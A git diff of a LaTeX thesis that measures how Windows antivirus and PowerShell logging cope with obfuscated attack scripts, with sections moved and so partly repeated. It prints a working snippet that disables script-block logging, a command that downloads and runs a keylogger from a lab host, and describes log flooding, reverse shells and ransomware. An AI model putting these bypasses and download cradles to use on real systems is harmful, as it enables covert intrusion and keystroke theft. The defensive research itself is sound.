@@ -55,19 +55,26 @@ Security vulnerabilities are patched constantly these days, which is why the att
 In this phase the attacker will try to delete any information that could indicate to the system admin that the system has been compromised. In general an attacker would remove all files used during the attack or changing log files which have documented the attack.
 
 \subsection{Goal}
-During the [\hyperlink{2}{2}]fourth phase of the attack, the attacker will try use many scripts in order to gain root access. One tool that has been used lately on windows system to execute malware is PowerShell. PowerShell is a very powerful shell, that has been introduced in the recent years by Microsoft. The tool is very flexible and therefore has become one of the go-to programs for attackers. Antivirus software have been scanning for these types of scripts by looking for patters inside the script and unusual commands that are invoked by PowerShell. In order to bypass this security feature, attackers have started to use a technique called [\hyperlink{3}{3}]\textbf{obfuscation}. Obfuscation is a trick to make code less readable, for both humans and machines, while retaining it's original function. Obfuscation was first used by programmers to make reading code harder in order to create a new line of defence against hackers. [\hyperlink{o3}{o3}] Attackers have since seen the usefulness of obfuscation and have started to use it to bypass scanning tools. To help the fight against the evil hackers, Daniel Bohannon has created a tool called [\hyperlink{o1}{o1}]Invoke-Obfuscation which can be used by the blue team, in order to simulated what attackers do and find ways to fix the problem. This thesis will focus on the Invoke-Obfuscation tool and its effectiveness for bypassing multiple Windows security systems. Additionally the thesis will atempt to find new forms of defence to strengthen the standard defence of windows machines.  The research questions for this thesis are:
+During the [\hyperlink{2}{2}]fourth phase of the attack, the attacker will try use many scripts in order to gain root access or steal valuable information. One tool that has been used lately on windows system to execute malware is [\hyperlink{12}{12}]PowerShell. PowerShell is a very powerful shell, that has been introduced in the recent years by Microsoft. The tool is very flexible and therefore has become one of the go-to programs for attackers. Antivirus software have been scanning for these types of scripts by looking for patters inside the script and unusual commands that are invoked by PowerShell. In order to bypass this security feature, attackers have started to use a technique called [\hyperlink{3}{3}]\textbf{obfuscation}. Obfuscation is a technique to make code less readable, for both humans and machines, while retaining it's original function. Obfuscation was first used by programmers to make reading code harder in order to create a new line of defence against hackers. [\hyperlink{o3}{o3}] Attackers have since seen the usefulness of obfuscation and have started to use it to bypass scanning tools. To help the fight against the evil hackers, Daniel Bohannon has created a tool called [\hyperlink{o1}{o1}]Invoke-Obfuscation which can be used by the blue team, in order to simulated what attackers do and find ways to fix the problem. This thesis will make use of the Invoke-Obfuscation tool to bypassing multiple Windows security systems. Additionally the thesis will atempt to find new forms of defence to strengthen the standard defence of windows machines.  The research questions that will be answered in this thesis are the following:
 \begin{enumerate}
 	\item[\textbf{main}]How well does Windows detect and defend itself against obfuscated PowerShell scripts?
 	\item[\textbf{sub-questions}]
 	\item Which obfuscation methods are labeled malicious by antivirus software, regardless of the content of the script.
 	\item Is it possible to bypass antivirus software,in order to download malware, by obfuscating the download command in PowerShell?
-	\item Does the PowerShell logging tool detect obfuscated commands? If so then, how hard is it to bypass it.
-	\item Is it possible to bypass antivirus software, in order to download malware, by using the download command in PowerShell?
-	\item What is the real performance of the PowerShell logging tool when large attacking scripts are executed.
-	\item In what ways can we bypass the standard defences of a Windows machine.
+	\item In what ways could the standard defence of a Windows machine be bypassed.
+	\item What is the real performance of the PowerShell logging tool when large obfuscated attacking scripts are executed.
+	\item What techniques can be used to bypass the logging of obfuscated commands.
 	\item What additional defence systems can be deployed against obfuscated PowerShell scripts.
 \end{enumerate}
-This thesis will answer the sub questions in the upcoming section first and will answer the main question in the final conclusion of the document.
+This thesis will answer the sub questions in the upcoming section first and will answer the main question in the final conclusion of the document. During the start of this thesis, through experimentation, it became clear that the standard defence of windows machines in particular windows 8,10, server 2016 and server 2019 were very effective in detecting and removing obfuscated malware from the system. This initially gives the impression that the problem of detecting obfuscated attack scripts is solved. But this cannot be concluded so easily. Therefore the first few sub-questions are focused on finding the potential threat of obfuscated powershell attack scripts. However since it is not clear what the exact defence strategy is for each av software, a initial sub question is proposed which is:\newline
+\hfill 
+\textbf{Which obfuscation methods are labeled malicious by antivirus software, regardless of the content of the script}.
+After answering the initial question, the thesis focuses on the application of abfuscation in other ways then obfuscating powershell malware. The questions that correspond to this are:\newline
+\textbf{Is it possible to bypass antivirus software,in order to download malware, by obfuscating the download command in PowerShell?}\newline
+With these questions, it will be shown that not all types of attacks are detected by the standard defence system. However some additional tools such as PowerShell logging seemed to be very promising. Therefore a closer look into PowerShell logging was required. To do this, the thesis will answer the question: \\
+\textbf{What is the real performance of the PowerShell logging tool when large obfuscated attacking scripts are executed.}
+In this section multiple different attacking scripts are performed on multiple machines. The result of these attacks can be found in the attachment along with some of the scripts used. After gaining this information, the thesis wil proceed with alaysing the defence systems that can be used in order to defend against an attack in the section:
+\textbf{What additional defence systems can be deployed against obfuscated PowerShell scripts.}
 \newline
 \newline
 \textbf{\textit{Note:}} It is important to note that since the thesis is mostly focused on scripts that might be used during post-exploitation's, that certain assumptions can be made before testing a certain script. An example of one assumption would be: "The attacker already has admin access to the system". Since the main goal is to measure windows' defence against obfuscated scripts, privileges like admin access or maintaining access can be assumed. For every script used in this thesis a small list of assumptions might be given before hand.
@@ -350,170 +357,7 @@ curl "http://IPAddress:Port/Get-Keystrokes.ps1" -o
 Many different iterations of the obfuscation tools were used, with the focus on [\hyperlink{o1}{o1}]Token,AST,String and Encoding. The answer was very clear, all antivirus programs were able to detect the malware before it got downloaded and blocked it one hundred percent of the time. On the other hand, when \textbf{secure-string} encoding is used, the script could be easily downloaded without notifying any AV program.
 \subsubsection{Conclusion}
 It does not seem to be possible to obfuscate the download command in order to download malware that otherwise would have been blocked. However it is fairly simple to get malware on the system by encoding the malware itself. This could be a problem when it comes to other types of malware.
-\subsection{Does the PowerShell logging tool detect obfuscated commands? If so then, how hard is it to bypass it.}
-PowerShell script logging is used by forensics teams to find what the attackers intentions were. [\hyperlink{o5}{o5}] But thanks to continuous development of the script logging tool, it is now also possible to detect an attack using by using the module logging and scriptblock logging tool (available in PowerShell v5 or later).
-\subsubsection{PowerShell Module Logging}
-[\hyperlink{o6}{o6}] Module Logging has been available since PowerShell v3. This logging tool logs command invocations, which can be very useful since some command invocations, such as "IEX Some-string", immediately raise suspicion. This tool logs these commands sometimes even if the command has been obfuscated. There are multiple log analysis tools that make use of the logs created by module logging to alert a server manager. Therefore bypassing the module logging is important.
-\subsubsection{PowerShell Script Block Logging}
-[\hyperlink{o6}{o6}]Script Block Logging logs the whole block of code just before it gets executed. This ensures that the whole attacking script is logged. It also deobfuscates the code if necessary. It also makes certain obfuscation techniques obsolete such as [\hyperlink{o6}{o6}] encoding in \textit{XOR},\textit{Base64} and \textit{ROT13}. Script block logging is only available on windows 10 and windows server 2016+. [\hyperlink{o6}{o6}] The script block logging tool also compares the code blocks with hashes of known malicious scripts as a quick check. If they match it can be found with the warning tag in the Event viewer.
-\subsubsection{Importance}
-SIEM tools (and [\hyperlink{o7}{o7}] AMSI) have become another line of defence. Therefore an attacker also needs to bypass the PowerShell logging tool during an attack. This makes the sub-question: \textbf{"Does the PowerShell logging tool detect obfuscated commands? If so then, how hard is it to bypass it"}. This question has been partly answered by [\hyperlink{o8}{o8}] Andy Green, who tested the module logging capabilities.Some obfuscated code can be deobfuscated by the logging tool (both module and code block logging). However when multiple iterations of obfuscation is used, the logging tool instead logs the obfuscated command with the obfuscation.
-\newline\newline
-\hypertarget{fig1}{
-	\textit{Figure 1: ScriptBlock logging log for large obfuscated Get-Keystokes.ps1 from PowerSploit}\\
-	\includegraphics[scale=0.44]{1.png}
-}
-
-However the fact that the obfuscated code can be logged completely can be a problem if read by the SIEM program. For example in figure $1$ it can be seen that the event viewer has labeled the scriptblock with the warning level. Therefore it might be important to find a way to make the logging tool completely irrelevant.
-
-It might be useful to note that when a command is to large to be written in one log event, it is split in multiple log events. This can also be seen in figure $1$ in the very first line saying:\textbf{"Creating Scriptblock text (2 of 52)"}. Further more the event viewer has a maximum storage value for each log, which is $15360$ kb. With this information a new question can be asked: \textbf{What happens if the scriptblock creates a larger log file then the maximum storage value?} The log file created by running the obfuscated Get-Keystrokes.ps1 file is $2.06$ mb. Therefore to answer the question above, the maximum storage capacity is shrunk to 1028kb. Executing the script again resulted in:\newline\newline
-
-\textit{Figure 2: ScriptBlock logging log for large obfuscated script with 1028kb storage space}\\
-\includegraphics[scale=0.44]{2}
-The log file has been written over multiple times which removed all the warning that it showed initially. However the event viewer also allows the server admin to store the log files when maximum capacity has been reached instead of deleting the oldest entry. In general it can be assumed that this option won't be used as it gives an attacker an easy way to fill the computers storage space with trivial commands. In fact after searching for log files with event ID $4104$ which is the event id used for scriptblock logging, it became apparent that none of the events were stored. This probably happened because the event viewer was trying to store all segmented parts of the scriptblock in one file.
-
-\subsubsection{Conclusion}
-The PowerShell logging tool is indeed capable to deobfuscate obfuscated scripts. The module logging, as stated in \hyperlink{o8}{o8}, can find invocation commands when called through the obfuscated script, which would mean that a SIEM tools could use the log file to detect a security breach. However bypassing it is fairly simple. A hacker could test the obfuscated script on his own VM first before running it on the victim's system in order to find the right obfuscation for the script. The PowerShell scriptblock logging tool on the other hand, is much more powerful. It can not only deobfuscate scriptblocks, it also can scan the unobfuscated scripts and compare them to known malicious scripts. When the logging tool finds a match it labels the scriptblock as potentially malicious which can be seen in \hyperlink{fig1}{figure 1}.
-There are multiple ways to bypass the logging tools. The most commonly used bypass would be [\hyperlink{o7}{o7}]:
-\begin{verbatim}
-$settings = [Ref].Assembly.GetType
-  (“System.Management.Automation.Utils")
-.GetField(“cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
-$settings
-[“HKEY_LOCAL_MACHINE\Software\Policies
-\Microsoft\Windows\PowerShell\ScriptBlockLogging"]
- = @{}
-$settings
-[“HKEY_LOCAL_MACHINE\Software\Policies
-\Microsoft\Windows\PowerShell\ScriptBlockLogging"]
-.Add(“EnableScriptBlockLogging", “0")
-\end{verbatim}
-And a similar command would deactivate PowerShell module logging. This command uses the group policy that has been cached and therefore does not require any additional privilege. Meaning it can be executed by any user. However it is important to note that the command itself has been logged. Which can trigger an alarm on its own. Therefore obfuscating this command would be necessary to bypass the PowerShell logging and the SIEM tools. To check the effectiveness of obfuscation, the command:
-\begin{verbatim}
-[Ref].Assembly.GetType("System.Management.Automation.Utils")
-.GetField("cachedGroupPolicySettings","NonPublic,Static")
-.GetValue($null)
-["HKEY_LOCAL_MACHINE\Software\Policies
-\Microsoft\Windows\PowerShell\ScriptBlockLogging"]
-= @{}
-\end{verbatim}
-was obfuscated 60 times, each having a distinct iteration of different obfuscation techniques. The result was that PowerShell module logging was able to deobfuscate to command currently each time. This is probably the case since the command is a well known command and so many hashes of this command have probably been stored to which the obfuscated files were compared to. The log file would reach a size of $6$ mb on average, which is fifty percent of the standard size of the log file. In these types of situations, increasing the size of the events logged by executing the script would be very useful as a bypass technique.
-
-\subsection{What is the real performance of the PowerShell logging tool when large attacking scripts are executed}
-Up until now, only small scripts or commands have been executed on PowerShell. This gives the logging tool enough time and space to log the events of one task efficiently. However real attack scripts can consist out of thousands lines of code i.e. (Invoke-Mimikatz.ps1 $2.745$ lines. Logging the deobfuscated commands of large obfuscated scripts should in theory be harder. Therefore it is important to analyse the real effect of the PowerShell logging tool. Therefore to answer the question \textbf{"What is the real performance of the PowerShell logging tool when large attacking scripts are executed"} it is required to execute several actual malicious scripts and analyse the out put of the PowerShell logging tool in the event viewer.
-\newline
-The flexibility and power of PowerShell allows attackers to use PowerShell in multiple ways and for multiple types of attacks. This thesis is will focus itself on the most common types of attacks.
-\newline
-\subsubsection{Types of attacks}
-According to [\hyperlink{o9}{o9}] the CESG, there are two types of attacks: Un-targeted attacks and Targeted attacks. Un-targeted attacks are attacks that indiscriminately attack as many devices as possible. Most windows users will have fallen victim to these types of attacks. While in targeted attacks, the attacker is focused on attacking a specific victim. Most attacked organisations will have fallen victim to these types of attacks. Each type of attack has its own attacking techniques:\\
-\textbf{Untargeted attacks}
-\begin{enumerate}
-	\item Phishing
-	\item Water holing
-	\item Ransomware
-	\item Scanning
-\end{enumerate}
-\textbf{Targeted attacks}
-\begin{enumerate}
-	\item Spear-phishing
-	\item Deploying a botnet
-	\item Subverting the supply chain
-	\item Brute force attacks
-	\item Malware execution
-	\item Man in the middle attack
-	\item Social engineering
-\end{enumerate}
-In the following sub-sections, the usage of several attacking scripts will be documented including the performance of PowerShell logging. Further more the attacking model that corresponds with the usage of the attacking script will be discussed. This will allow for a better assessment of the potential threat of PowerShell scripts.\\
-\newline
-\textbf{\textit{Note:}}\\
-Since this section is mostly focused on PowerShell logging, the AV might be disabled in order to execute some of the attack scripts. If this is the case, then it will be stated in the subsection of the corresponding attacking script. The original version of the script is for the sake of reproducibility also added as attachment under \hyperlink{scrip2}{Keylogger.ps1}
-
-\subsubsection{Keylogger}
-[\hyperlink{o10}{o10}]This keylogger script is proof of case script, meaning that it is written such a way such that it cannot be used as a real keylogger as is. Although the number of changes required to be made in order to use this keylogger as actual malware is minimal.
-\paragraph{Attack model}\hfill
-\newline
-To make use of this script, the attacker can make use of two different attack models. In the first model, the attacker could gain access to a local machines and execute the script. This script does not require admin privileges in order to execute, therefore the victim machine is not required to be a system that can give the attacker admin privileges.
-\newline
-\\
-The second attack model consists is the more real model used with these types of scripts. That is: the attacker will send an email to random email addresses claiming that the file within the mail has some encrypted secret stored inside, which can only be decrypted if the file is executed. This attack model in general raises suspicion which would mean that the attacker will be required to use some form of social engineering to lower the users suspicion. Also it might be use full to note that although Microsoft, as a security measure, has designed the admin privilege request in a way such that the user is always aware of giving a file admin privileges, that this security measure does not hold much value in the real world as most users will click on the yes button of the prompt without giving it a second thought. [\hyperlink{7}{7}]This has been proven time and again by the number of user agreement that have been agreed on by software users which have not been read.
-\paragraph{Description}\hfill\newline
-This script runs a process that uses the GetAsyncKeyState api and stores the value of this key in a file which has its path stored in \$Path. The script terminates if \textbf{Ctrl$+$C} is pressed and opens the file with the stored keys using notepad. This script consists out of 42 lines of code and therefore is a good script to start with in order to answer the sub question of this section.
-
-\paragraph{Usage}\hfill\newline
-This script is run on Windows $8.1$ and Windows Server $2019$ since Windows Server $2016$ and Windows $10$ have the same logging capabilities as Windows Server $2019$. Since the focus is on how PowerShell logging will interact with the script, the attack models are ignored. Instead the script is executed and downloaded using the unobfuscated PowerShell command:
-\begin{verbatim}
-Invoke-Expression (New-Object Net.WebClient)
-.DownloadString("http://192.168.2.36:8000/Keylogger.ps1");
-\end{verbatim}
-\paragraph{\textbf{Obfuscation commands}}\hfill
-\newline
-\hypertarget{obfuscation}
-The script is manually obfuscated with Invoke-Obfuscation using the following obfuscation commands in the corresponding order:
-\begin{enumerate}
-	\item AST ALL
-	\item Encoding 2 (HEX)
-	\item String 1
-	\item Encoding 7 (Special characters)
-	\item Encoding 4 (Binary)
-\end{enumerate}
-The resulting script has a length of $881651$ characters.
-\paragraph{Windows 10/Server 2016/ Server 2019}
-In order to execute the script AV was disabled. After executing the script (for about 15 secconds) the following has been noted:
-\begin{enumerate}
-	\item Windows PowerShell log file (includes module logging) generated $9296$ events. The file size is $15$ mb.
-	\item PowerShell Operational log file (includes scriptblock logging) generated $8291$ events. The file size is $16.50$ mb.
-	\item No warning-level events were logged.
-	\item Highest level event is verbose.
-	\item De-obfuscated code was still entangled with obfuscated code.
-\end{enumerate}
-The following has been noted after executing the unobfuscated \hyperlink{script2}{script}:
-\begin{enumerate}
-	\item Windows PowerShell log file (includes module logging) generated $550$ events. The file size is $1$ mb.
-	\item PowerShell Operational log file (includes scriptblock logging) generated $556$ events. The file size is $1,07$ mb.
-	\item One warning-level event were logged.
-	\item Highest level event is warning.
-	\item Deobfuscated code was clearly visible entangled with obfuscated code.
-\end{enumerate}
-
-\paragraph{Windows 8.1 (Default PowerShell logging)}\hfill\newline
-Most windows $8$ users will have the default installation of windows 8. This version of windows $8$ does not include module logging and script block logging. Therefore in this section, the effectiveness of default PowerShell logging is documented.
-In order to execute the script AV was disabled.
-
-\paragraph{Windows 8.1 (Advanced PowerShell logging)}\hfill\newline
-In this section the performance of PowerShell logging ,including module and script block logging, is analysed.In order to execute the script AV was disabled.
-The results of this have been documented in table $6$ of the attachment. The results of windows $10/2016/2019$ have also been added to this table.
-
-\paragraph{Intermediary Results}\hfill\newline
-The results found for Obfuscated scripts are suspicious. Each log file was cleared before running the scripts. Therefore since all log files had reached the same size, it could only mean that the maximum size of the log files have been reached. This would mean that some log entries have been missed. So to test this, the log settings have been changed such that if the log file has reached the maximum length, it will be stored and a new log file will be used for new entries. After doing this, the scripts, both obfuscated and unobfuscated, was run again. The results can be found in table $7$ in the attachments. Table $7$ clearly shows that a large part of the log file was deleted before. Therefore from this point on, the attack scripts will only be run while having archiving enabled.
-
-\subsubsection{Ransomware}
-The next malware script is ransomware. Ransomware is a type of malware that encrypts user files and required the victim to pay ransom in order to decrypt and retrieve their stolen files. This particular ransomware script encrypts everything in the given path directory using 7zip. Before encrypting the files found, the script generates a random key that is used to encrypt the files found. This key is then sent to the attacker through a mail system. This code can be considered as malicious, therefore it will not be shared in this thesis. The script is used for untargeted attacks, which is enabled by the mailing feature, and uses the same attack model as Keylogger.ps1. Furthermore the script requires admin privileges to function correctly. The script terminates on its own. This means that it is not necessary to measure the execution time since longer execution time does not correspond to more operations.
-In this test the script was obfuscated using the previously described \hyperlink{obfuscation}{obfuscation} commands excepts for the last command, meaning binary encoding. This command had to be removed since Invoke-Obfuscation would create a file to large for the test system to handle, therefore crashing the machine.
-
-\subsubsection{Reverse Shell}
-A reverse shell is a script that allows a remote user to have direct access to a victims computer. ReverseShell scripts in PowerShell will allow the attacker to gain remote access to a terminal. And therefore have complete access to all the tools and functions that make PowerShell so powerful. Attackers make use of reverse shell terminals mainly to scan the victims machine (Reconnaissance), download viruses and exploit security vulnerabilities. The ways in which a reverse shell can be created can vary greatly. An example of deploying a reverse shell is sketched in the next section.
-\paragraph{Attack model}\hfill
-\newline
-The attacker visits a website which has a php backend. He then uploads a php file in a insecure field which was meant to be used to upload images. When the attacker now visits the page in which the image was supposed to be displayed, the php script uploaded by the attacker is executed. The attackers script makes use of:
-\begin{verbatim}shell_exec\end{verbatim}
-Therefore the php file, when executed, will start a PowerShell terminal to execute the command written in the php file. The attacker can make use of this command field to open up a reverse shell terminal. In this test, the script was obfuscated using the same \hyperlink{obfuscation}{obfuscation} commands as described previously. The command \textbf{Invoke-ALLChecks} was used after executing the script. 
-\newline\newline
-\textit{\textbf{NOTE:}}The reverse shell script was used with a non-administrator account, with AV turned on.
-\newline
-
-
-\subsubsection{Privilege Escalation}
-Privilege escalation attacks, are attacks that make use of software vulnerabilities to gain administrator privileges. This would allow the user to gain access to restricted parts of a computer (including the file in which the administrators key is stored) and run more malicious scripts. If an attacker gains access to the password of an administrator, then he can access the machine at any given time without raising an alarm. It is not hard to see why every attacker would want this type of access. But gaining admin privileges is in general much harder then gaining access to a system or exploiting some vulnerabilities. Manual privilege escalation usually requires a deep understanding of the system and software that is used. For that reason it is difficult for most attacker to execute privilege escalation attack on their own. To circumvent this problem, most attackers make use of pre-written scripts, including PowerShell scripts, to gain administrator access. That also means that if a perfect defence system against scripting was feasible, then it would become almost impossible for most attackers to gain administrator privileges. But as is right now, a `script kiddie`, a term used to refer to a person who can only attack a computer using existing scripts while lacking any understanding of the script or the ability to write their own, can gain administrator privileges. In this section a popular PowerShell script called 'Privesc' will be used. This script scans the computer for known vulnerabilities, and suggests to the user some attacks that he then can execute. Because the script may require user input multiple times, these type of scripts are run by attackers after the attacker establishes a reverse shell. Which as shown in the previous section can be established without triggering the AV program. In this test no obfuscation is used, since Privesc comes with its own obfuscation. Any further obfuscation results in a crash since the file itself exists out of four thousand lines with each line containing at least ten characters. The results can be found in table $11$.
-
-\subsubsection{Conclusion}
-During the execution of all scripts, the PowerShell logging tool generated a large number of log entries. While the execution time was fairly short, the number of log entries created easily exceeded hundreds of megabytes. The AV was able to detect the keylogger script, and the ransomware script, while failing to detect the reverse shell script and the privilege escalation script. During the execution of Privesc.ps1, the DLLInjection command was used to inject a command inside a dll service. This was also not detected by the AV. Since the AV was not able to detect the scripts, it can also be assumed that the AMSI tool did not detect it either, which shows that there are scripts that attackers can use during their attacking process, that will go through the default defence system of the average user. But when looking at the event logger, we can see in table \hyperlink{table9}{9} and table{table10}{10} that, the event logger was able to detect some suspicious activity which were documented in the log file with the warning level. Further more the event viewer shows that some scriptblocks are to large to fit in one event viewer. This can be seen in image \hyperlink{fig1}{1}, where the log event states:
-\begin{verbatim}
-Creating Scriptblock text (2 of 52)
-\end{verbatim}
-This means that a very large script, large as in the script contains a high number of symbols, is executed. As mentioned before the obfuscation techniques of Invoke-Obfuscation create large scripts when obfuscated. Most scripts when obfuscated end up being larger then five hundred thousand symbols. So this event log, could perhaps indicate that an obfuscated file was executed. 
-The windows versions,Windows $7$ and $8$ Home edition, which do not have scriptblock logging and module logging, did not show any sign of suspicious behavior. Which means that a new line of defence built around logging would be useless. It might be worth noting that scriptblock and module logging can be added to windows $7$ and $8$ if the OS is upgraded to pro edition. It is fair to assume that most people will not buy the upgrade, therefore leaving them vulnerable to some attacks. But if scriptblock and module logging are enabled and configured correctly, then they can act as another layer of defence. Some possible configurations will be presented in the next section.
-
-\subsection{In what ways can we bypass the standard defences of a Windows machine}
+\subsection{In what ways could the standard defence of a Windows machine be bypassed.}
 In this section, a sub-question will be answered that will aid with answering the upcoming sub-question: "What additional defence systems can be deployed against obfuscated PowerShell scripts". In order to answer this question, in this section a real world attack will be simulated. Therefore this section will be written from the perspective of the attacker. The results of the attack process will then afterwards be discussed from a defenders point of view.
 
 \subsubsection{Test Environment}
@@ -668,6 +512,169 @@ To gain a log file with the least amount of noise possible, as in log entries th
 \textit{Figure 5: ScriptBlockLogging log for Invoke-SuperScript.ps1 Unobfuscated}\\
 \includegraphics[scale=0.40]{21.png}
 The log file was able to mark the scripts with the warning level. This already seems more promising then the AV-programs. However as mentioned in section 3.2, the attacker can obfuscate their script in order to overwrite important log entries and therefore cover their tracks. Although this attack was tested on a machine using the archiving property of Event Viewer, the default setting is to overwrite old event entries. Meaning that a obfuscated script would in general overwrite the important log entries shown in figure $5$. In the next section, the thesis will discus some strategies to circumvent this issue.
+\subsection{What is the real performance of the PowerShell logging tool when large attacking scripts are executed}
+Up until now, only small scripts or commands have been executed on PowerShell. This gives the logging tool enough time and space to log the events of one task efficiently. However real attack scripts can consist out of thousands lines of code i.e. (Invoke-Mimikatz.ps1 $2.745$ lines. Logging the deobfuscated commands of large obfuscated scripts should in theory be harder. Therefore it is important to analyse the real effect of the PowerShell logging tool. Therefore to answer the question \textbf{"What is the real performance of the PowerShell logging tool when large attacking scripts are executed"} it is required to execute several actual malicious scripts and analyse the out put of the PowerShell logging tool in the event viewer.
+\newline
+The flexibility and power of PowerShell allows attackers to use PowerShell in multiple ways and for multiple types of attacks. This thesis is will focus itself on the most common types of attacks.
+\newline
+\subsubsection{Types of attacks}
+According to [\hyperlink{o9}{o9}] the CESG, there are two types of attacks: Un-targeted attacks and Targeted attacks. Un-targeted attacks are attacks that indiscriminately attack as many devices as possible. Most windows users will have fallen victim to these types of attacks. While in targeted attacks, the attacker is focused on attacking a specific victim. Most attacked organisations will have fallen victim to these types of attacks. Each type of attack has its own attacking techniques:\\
+\textbf{Untargeted attacks}
+\begin{enumerate}
+	\item Phishing
+	\item Water holing
+	\item Ransomware
+	\item Scanning
+\end{enumerate}
+\textbf{Targeted attacks}
+\begin{enumerate}
+	\item Spear-phishing
+	\item Deploying a botnet
+	\item Subverting the supply chain
+	\item Brute force attacks
+	\item Malware execution
+	\item Man in the middle attack
+	\item Social engineering
+\end{enumerate}
+In the following sub-sections, the usage of several attacking scripts will be documented including the performance of PowerShell logging. Further more the attacking model that corresponds with the usage of the attacking script will be discussed. This will allow for a better assessment of the potential threat of PowerShell scripts.\\
+\newline
+\textbf{\textit{Note:}}\\
+Since this section is mostly focused on PowerShell logging, the AV might be disabled in order to execute some of the attack scripts. If this is the case, then it will be stated in the subsection of the corresponding attacking script. The original version of the script is for the sake of reproducibility also added as attachment under \hyperlink{scrip2}{Keylogger.ps1}
+
+\subsubsection{Keylogger}
+[\hyperlink{o10}{o10}]This keylogger script is proof of case script, meaning that it is written such a way such that it cannot be used as a real keylogger as is. Although the number of changes required to be made in order to use this keylogger as actual malware is minimal.
+\paragraph{Attack model}\hfill
+\newline
+To make use of this script, the attacker can make use of two different attack models. In the first model, the attacker could gain access to a local machines and execute the script. This script does not require admin privileges in order to execute, therefore the victim machine is not required to be a system that can give the attacker admin privileges.
+\newline
+\\
+The second attack model consists is the more real model used with these types of scripts. That is: the attacker will send an email to random email addresses claiming that the file within the mail has some encrypted secret stored inside, which can only be decrypted if the file is executed. This attack model in general raises suspicion which would mean that the attacker will be required to use some form of social engineering to lower the users suspicion. Also it might be use full to note that although Microsoft, as a security measure, has designed the admin privilege request in a way such that the user is always aware of giving a file admin privileges, that this security measure does not hold much value in the real world as most users will click on the yes button of the prompt without giving it a second thought. [\hyperlink{7}{7}]This has been proven time and again by the number of user agreement that have been agreed on by software users which have not been read.
+\paragraph{Description}\hfill\newline
+This script runs a process that uses the GetAsyncKeyState api and stores the value of this key in a file which has its path stored in \$Path. The script terminates if \textbf{Ctrl$+$C} is pressed and opens the file with the stored keys using notepad. This script consists out of 42 lines of code and therefore is a good script to start with in order to answer the sub question of this section.
+
+\paragraph{Usage}\hfill\newline
+This script is run on Windows $8.1$ and Windows Server $2019$ since Windows Server $2016$ and Windows $10$ have the same logging capabilities as Windows Server $2019$. Since the focus is on how PowerShell logging will interact with the script, the attack models are ignored. Instead the script is executed and downloaded using the unobfuscated PowerShell command:
+\begin{verbatim}
+Invoke-Expression (New-Object Net.WebClient)
+.DownloadString("http://192.168.2.36:8000/Keylogger.ps1");
+\end{verbatim}
+\paragraph{\textbf{Obfuscation commands}}\hfill
+\newline
+\hypertarget{obfuscation}
+The script is manually obfuscated with Invoke-Obfuscation using the following obfuscation commands in the corresponding order:
+\begin{enumerate}
+	\item AST ALL
+	\item Encoding 2 (HEX)
+	\item String 1
+	\item Encoding 7 (Special characters)
+	\item Encoding 4 (Binary)
+\end{enumerate}
+The resulting script has a length of $881651$ characters.
+\paragraph{Windows 10/Server 2016/ Server 2019}
+In order to execute the script AV was disabled. After executing the script (for about 15 secconds) the following has been noted:
+\begin{enumerate}
+	\item Windows PowerShell log file (includes module logging) generated $9296$ events. The file size is $15$ mb.
+	\item PowerShell Operational log file (includes scriptblock logging) generated $8291$ events. The file size is $16.50$ mb.
+	\item No warning-level events were logged.
+	\item Highest level event is verbose.
+	\item De-obfuscated code was still entangled with obfuscated code.
+\end{enumerate}
+The following has been noted after executing the unobfuscated \hyperlink{script2}{script}:
+\begin{enumerate}
+	\item Windows PowerShell log file (includes module logging) generated $550$ events. The file size is $1$ mb.
+	\item PowerShell Operational log file (includes scriptblock logging) generated $556$ events. The file size is $1,07$ mb.
+	\item One warning-level event were logged.
+	\item Highest level event is warning.
+	\item Deobfuscated code was clearly visible entangled with obfuscated code.
+\end{enumerate}
+
+\paragraph{Windows 8.1 (Default PowerShell logging)}\hfill\newline
+Most windows $8$ users will have the default installation of windows 8. This version of windows $8$ does not include module logging and script block logging. Therefore in this section, the effectiveness of default PowerShell logging is documented.
+In order to execute the script AV was disabled.
+
+\paragraph{Windows 8.1 (Advanced PowerShell logging)}\hfill\newline
+In this section the performance of PowerShell logging ,including module and script block logging, is analysed.In order to execute the script AV was disabled.
+The results of this have been documented in table $6$ of the attachment. The results of windows $10/2016/2019$ have also been added to this table.
+
+\paragraph{Intermediary Results}\hfill\newline
+The results found for Obfuscated scripts are suspicious. Each log file was cleared before running the scripts. Therefore since all log files had reached the same size, it could only mean that the maximum size of the log files have been reached. This would mean that some log entries have been missed. So to test this, the log settings have been changed such that if the log file has reached the maximum length, it will be stored and a new log file will be used for new entries. After doing this, the scripts, both obfuscated and unobfuscated, was run again. The results can be found in table $7$ in the attachments. Table $7$ clearly shows that a large part of the log file was deleted before. Therefore from this point on, the attack scripts will only be run while having archiving enabled.
+
+\subsubsection{Ransomware}
+The next malware script is ransomware. Ransomware is a type of malware that encrypts user files and required the victim to pay ransom in order to decrypt and retrieve their stolen files. This particular ransomware script encrypts everything in the given path directory using 7zip. Before encrypting the files found, the script generates a random key that is used to encrypt the files found. This key is then sent to the attacker through a mail system. This code can be considered as malicious, therefore it will not be shared in this thesis. The script is used for untargeted attacks, which is enabled by the mailing feature, and uses the same attack model as Keylogger.ps1. Furthermore the script requires admin privileges to function correctly. The script terminates on its own. This means that it is not necessary to measure the execution time since longer execution time does not correspond to more operations.
+In this test the script was obfuscated using the previously described \hyperlink{obfuscation}{obfuscation} commands excepts for the last command, meaning binary encoding. This command had to be removed since Invoke-Obfuscation would create a file to large for the test system to handle, therefore crashing the machine.
+
+\subsubsection{Reverse Shell}
+A reverse shell is a script that allows a remote user to have direct access to a victims computer. ReverseShell scripts in PowerShell will allow the attacker to gain remote access to a terminal. And therefore have complete access to all the tools and functions that make PowerShell so powerful. Attackers make use of reverse shell terminals mainly to scan the victims machine (Reconnaissance), download viruses and exploit security vulnerabilities. The ways in which a reverse shell can be created can vary greatly. An example of deploying a reverse shell is sketched in the next section.
+\paragraph{Attack model}\hfill
+\newline
+The attacker visits a website which has a php backend. He then uploads a php file in a insecure field which was meant to be used to upload images. When the attacker now visits the page in which the image was supposed to be displayed, the php script uploaded by the attacker is executed. The attackers script makes use of:
+\begin{verbatim}shell_exec\end{verbatim}
+Therefore the php file, when executed, will start a PowerShell terminal to execute the command written in the php file. The attacker can make use of this command field to open up a reverse shell terminal. In this test, the script was obfuscated using the same \hyperlink{obfuscation}{obfuscation} commands as described previously. The command \textbf{Invoke-ALLChecks} was used after executing the script. 
+\newline\newline
+\textit{\textbf{NOTE:}}The reverse shell script was used with a non-administrator account, with AV turned on.
+\newline
+
+\subsubsection{Privilege Escalation}
